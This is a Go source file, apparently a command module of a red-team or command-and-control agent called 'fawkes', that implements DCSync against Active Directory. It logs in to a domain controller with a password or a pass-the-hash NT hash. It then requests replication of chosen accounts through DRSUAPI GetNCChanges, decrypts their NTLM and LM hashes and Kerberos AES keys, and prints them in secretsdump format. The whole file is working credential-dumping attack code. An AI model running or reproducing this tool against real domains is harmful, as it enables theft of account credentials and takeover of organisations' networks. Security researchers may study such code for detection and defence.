package commands

import (
	"context"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	"github.com/oiweiwei/go-msrpc/midl/uuid"
	"github.com/oiweiwei/go-msrpc/msrpc/drsr/drsuapi/v4"
	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
	"github.com/oiweiwei/go-msrpc/msrpc/epm/epm/v3"
	"github.com/oiweiwei/go-msrpc/msrpc/erref/drsr"
	"github.com/oiweiwei/go-msrpc/msrpc/samr/samr/v1"
	"github.com/oiweiwei/go-msrpc/ndr"
	"github.com/oiweiwei/go-msrpc/ssp"
	sspcred "github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"

	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
)

type DcsyncCommand struct{}

func (c *DcsyncCommand) Name() string        { return "dcsync" }
func (c *DcsyncCommand) Description() string { return "DCSync — replicate AD credentials via DRS (T1003.006)" }

type dcsyncArgs struct {
	Server   string `json:"server"`   // domain controller IP/hostname
	Username string `json:"username"` // account with replication rights
	Password string `json:"password"` // password
	Hash     string `json:"hash"`     // NT hash for pass-the-hash
	Domain   string `json:"domain"`   // domain (auto-detected from username)
	Target   string `json:"target"`   // target account(s), comma-separated
	Timeout  int    `json:"timeout"`  // timeout in seconds (default: 120)
}

type dcsyncResult struct {
	Username                string
	RID                     uint32
	NTHash                  string
	LMHash                  string
	AES256Key               string
	AES128Key               string
	PasswordLastSet         string
	UserAccountControl      uint32
	SupplementalCredentials []string // additional kerberos keys
}

func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Use -server <DC> -username <user> -password <pass> -target <account>",
			Status:    "error",
			Completed: true,
		}
	}

	var args dcsyncArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Server == "" || args.Username == "" || (args.Password == "" && args.Hash == "") {
		return structs.CommandResult{
			Output:    "Error: server, username, and password (or hash) are required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Target == "" {
		return structs.CommandResult{
			Output:    "Error: target account(s) required. Use -target Administrator or -target \"admin,krbtgt\"",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Timeout <= 0 {
		args.Timeout = 120
	}

	// Parse domain from username
	if args.Domain == "" {
		if parts := strings.SplitN(args.Username, `\`, 2); len(parts) == 2 {
			args.Domain = parts[0]
			args.Username = parts[1]
		} else if parts := strings.SplitN(args.Username, "@", 2); len(parts) == 2 {
			args.Domain = parts[1]
			args.Username = parts[0]
		}
	}

	// Format credential as DOMAIN\user for go-msrpc
	credUser := args.Username
	if args.Domain != "" {
		credUser = args.Domain + `\` + args.Username
	}

	// Parse target accounts
	targets := []string{}
	for _, t := range strings.Split(args.Target, ",") {
		t = strings.TrimSpace(t)
		if t != "" {
			targets = append(targets, t)
		}
	}

	if len(targets) == 0 {
		return structs.CommandResult{
			Output:    "Error: no valid target accounts specified",
			Status:    "error",
			Completed: true,
		}
	}

	// Set up GSSAPI context (per-context to avoid global state conflicts)
	var cred sspcred.Credential
	if args.Hash != "" {
		// Strip LM hash if LM:NT format
		hash := args.Hash
		if parts := strings.SplitN(hash, ":", 2); len(parts) == 2 && len(parts[0]) == 32 && len(parts[1]) == 32 {
			hash = parts[1]
		}
		cred = sspcred.NewFromNTHash(credUser, hash)
	} else {
		cred = sspcred.NewFromPassword(credUser, args.Password)
	}

	ctx, cancel := context.WithTimeout(gssapi.NewSecurityContext(context.Background(),
		gssapi.WithCredential(cred),
		gssapi.WithMechanismFactory(ssp.SPNEGO),
		gssapi.WithMechanismFactory(ssp.NTLM),
	), time.Duration(args.Timeout)*time.Second)
	defer cancel()

	// Connect via EPM (Endpoint Mapper, port 135)
	cc, err := dcerpc.Dial(ctx, "ncacn_ip_tcp:"+args.Server,
		epm.EndpointMapper(ctx,
			net.JoinHostPort(args.Server, "135"),
			dcerpc.WithInsecure(),
		))
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error connecting to %s via DCE-RPC: %v", args.Server, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer cc.Close(ctx)

	// Create DRSUAPI client with encryption
	targetName := args.Server
	cli, err := drsuapi.NewDrsuapiClient(ctx, cc, dcerpc.WithSeal(), dcerpc.WithTargetName(targetName))
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating DRSUAPI client: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// DRSBind
	clientCaps := drsuapi.ExtensionsInt{
		Flags:   drsuapi.ExtGetNCChangesRequestV8 | drsuapi.ExtStrongEncryption | drsuapi.ExtGetNCChangesReplyV6,
		ExtCaps: 0xFFFFFFFF,
	}

	capsBytes, err := ndr.Marshal(&clientCaps, ndr.Opaque)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error marshaling client capabilities: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	bindResp, err := cli.Bind(ctx, &drsuapi.BindRequest{
		Client: &drsuapi.Extensions{Data: capsBytes},
	})
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error DRSBind to %s: %v", args.Server, err),
			Status:    "error",
			Completed: true,
		}
	}

	// CrackNames — resolve target account names to GUIDs.
	// If we have a domain, use NT4 format (NETBIOS\account) for unambiguous resolution
	// in multi-domain forests. Otherwise use SansDomainEx (plain name, DC resolves locally).
	var crackFormat uint32
	crackTargets := make([]string, len(targets))
	if args.Domain != "" {
		// Derive NetBIOS domain from FQDN (first DNS label, uppercased)
		netbios := strings.ToUpper(strings.SplitN(args.Domain, ".", 2)[0])
		crackFormat = uint32(drsuapi.DSNameFormatNT4AccountName)
		for i, t := range targets {
			crackTargets[i] = netbios + `\` + t
		}
	} else {
		crackFormat = uint32(drsuapi.DSNameFormatNT4AccountNameSANSDomainEx)
		copy(crackTargets, targets)
	}

	cracked, err := cli.CrackNames(ctx, &drsuapi.CrackNamesRequest{
		Handle:    bindResp.DRS,
		InVersion: 1,
		In: &drsuapi.MessageCrackNamesRequest{
			Value: &drsuapi.MessageCrackNamesRequest_V1{
				V1: &drsuapi.MessageCrackNamesRequestV1{
					FormatOffered: crackFormat,
					Names:         crackTargets,
					FormatDesired: uint32(drsuapi.DSNameFormatUniqueIDName),
				},
			},
		},
	})
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error DRSCrackNames: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	items := cracked.Out.GetValue().(*drsuapi.MessageCrackNamesReplyV1).Result.Items

	var sb strings.Builder
	authMethod := "password"
	if args.Hash != "" {
		authMethod = "PTH"
	}
	sb.WriteString(fmt.Sprintf("[*] DCSync via DRSGetNCChanges against %s (%s)\n", args.Server, authMethod))
	sb.WriteString(fmt.Sprintf("[*] Credentials: %s\n", credUser))
	sb.WriteString(strings.Repeat("-", 60) + "\n")

	successCount := 0

	for i, item := range items {
		if item.Status != 0 {
			sb.WriteString(fmt.Sprintf("[!] %s — CrackNames failed: %v\n", targets[i], drsr.FromCode(int32(item.Status))))
			continue
		}

		// GetNCChanges — replicate the object
		nc, err := cli.GetNCChanges(ctx, &drsuapi.GetNCChangesRequest{
			Handle:    bindResp.DRS,
			InVersion: 8,
			In: &drsuapi.MessageGetNCChangesRequest{
				Value: &drsuapi.MessageGetNCChangesRequest_V8{
					V8: &drsuapi.MessageGetNCChangesRequestV8{
						MaxObjectsCount: 1,
						NC: &drsuapi.DSName{
							GUID: dtyp.GUIDFromUUID(uuid.MustParse(item.Name)),
						},
						Flags:             drsuapi.InitSync | drsuapi.GetAncestor | drsuapi.GetAllGroupMembership | drsuapi.WritableReplica,
						ExtendedOperation: drsuapi.ExtendedOperationReplicationObject,
					},
				},
			},
		})
		if err != nil {
			sb.WriteString(fmt.Sprintf("[!] %s — GetNCChanges failed: %v\n", targets[i], err))
			continue
		}

		result := dcsyncParseReply(cli, nc, targets[i])
		if result != nil {
			successCount++
			sb.WriteString(fmt.Sprintf("\n[+] %s (RID: %d)\n", result.Username, result.RID))
			if result.NTHash != "" {
				sb.WriteString(fmt.Sprintf("    NTLM:   %s\n", result.NTHash))
			}
			if result.LMHash != "" && result.LMHash != "aad3b435b51404eeaad3b435b51404ee" {
				sb.WriteString(fmt.Sprintf("    LM:     %s\n", result.LMHash))
			}
			if result.AES256Key != "" {
				sb.WriteString(fmt.Sprintf("    AES256: %s\n", result.AES256Key))
			}
			if result.AES128Key != "" {
				sb.WriteString(fmt.Sprintf("    AES128: %s\n", result.AES128Key))
			}
			// Secretsdump format line
			lm := result.LMHash
			if lm == "" {
				lm = "aad3b435b51404eeaad3b435b51404ee"
			}
			nt := result.NTHash
			if nt == "" {
				nt = "31d6cfe0d16ae931b73c59d7e0c089c0"
			}
			sb.WriteString(fmt.Sprintf("    Hash:   %s:%d:%s:%s:::\n", result.Username, result.RID, lm, nt))
		}
	}

	sb.WriteString(fmt.Sprintf("\n[*] %d/%d accounts dumped successfully\n", successCount, len(targets)))

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func dcsyncParseReply(cli drsuapi.DrsuapiClient, nc *drsuapi.GetNCChangesResponse, targetName string) *dcsyncResult {
	reply := nc.Out.GetValue().(*drsuapi.MessageGetNCChangesReplyV6)
	if reply.Objects == nil || reply.Objects.EntityInfo == nil {
		return nil
	}

	prefixes := reply.PrefixTableSource.Build()

	result := &dcsyncResult{Username: targetName}

	var unicodePwd []byte
	var dbcsPwd []byte
	var supplementalCreds []byte
	var sid *dtyp.SID

	for _, attr := range reply.Objects.EntityInfo.AttributeBlock.Attribute {
		oid, err := prefixes.AttributeToOID(attr.AttributeType)
		if err != nil {
			continue
		}
		oidStr := oid.String()

		if len(attr.AttributeValue.Values) == 0 {
			continue
		}
		val := attr.AttributeValue.Values[0].Value

		switch oidStr {
		case "1.2.840.113556.1.4.90": // unicodePwd
			unicodePwd = val
		case "1.2.840.113556.1.4.55": // dBCSPwd (LM hash)
			dbcsPwd = val
		case "1.2.840.113556.1.4.125": // supplementalCredentials
			supplementalCreds = val
		case "1.2.840.113556.1.4.146": // objectSid
			s := &dtyp.SID{}
			if err := ndr.Unmarshal(val, s, ndr.Opaque); err == nil {
				sid = s
			}
		case "1.2.840.113556.1.4.221": // sAMAccountName
			if len(val) >= 2 {
				result.Username = dcsyncDecodeUTF16LE(val)
			}
		}
	}

	// Extract RID from SID
	if sid != nil && len(sid.SubAuthority) > 0 {
		result.RID = sid.SubAuthority[len(sid.SubAuthority)-1]
	}

	// Decrypt NT hash
	if len(unicodePwd) > 0 {
		pwd, err := drsuapi.DecryptHash(cli.Conn().Context(), result.RID, unicodePwd)
		if err == nil {
			result.NTHash = hex.EncodeToString(pwd)
		}
	}

	// Decrypt LM hash
	if len(dbcsPwd) > 0 {
		pwd, err := drsuapi.DecryptHash(cli.Conn().Context(), result.RID, dbcsPwd)
		if err == nil {
			result.LMHash = hex.EncodeToString(pwd)
		}
	}

	// Decrypt supplemental credentials (Kerberos keys)
	if len(supplementalCreds) > 0 {
		creds, err := drsuapi.DecryptData(cli.Conn().Context(), supplementalCreds)
		if err == nil {
			props := samr.UserProperties{}
			if err := ndr.Unmarshal(creds, &props, ndr.Opaque); err == nil {
				for _, prop := range props.UserProperties {
					name := strings.TrimRight(prop.PropertyName, "\x00")
					if name == "Primary:Kerberos-Newer-Keys" || name == "Primary:Kerberos" {
						dcsyncExtractKerberosKeys(prop, result)
					}
				}
			}
		}
	}

	return result
}

func dcsyncExtractKerberosKeys(prop *samr.UserProperty, result *dcsyncResult) {
	if prop.PropertyValue == nil {
		return
	}

	// AES256 etype = 18, AES128 etype = 17
	switch cred := prop.PropertyValue.GetValue().(type) {
	case *samr.KerberosStoredCredentialNew:
		for _, key := range cred.Credentials {
			keyHex := hex.EncodeToString(key.KeyData)
			switch key.KeyType {
			case 18: // AES256-CTS-HMAC-SHA1
				result.AES256Key = keyHex
			case 17: // AES128-CTS-HMAC-SHA1
				result.AES128Key = keyHex
			}
		}
	case *samr.KerberosStoredCredential:
		for _, key := range cred.Credentials {
			keyHex := hex.EncodeToString(key.KeyData)
			switch key.KeyType {
			case 18:
				result.AES256Key = keyHex
			case 17:
				result.AES128Key = keyHex
			}
		}
	}
}

func dcsyncDecodeUTF16LE(b []byte) string {
	// Decode UTF-16LE bytes to string, stripping null terminators
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	runes := make([]rune, 0, len(b)/2)
	for i := 0; i+1 < len(b); i += 2 {
		r := rune(binary.LittleEndian.Uint16(b[i : i+2]))
		if r == 0 {
			break
		}
		runes = append(runes, r)
	}
	return string(runes)
}
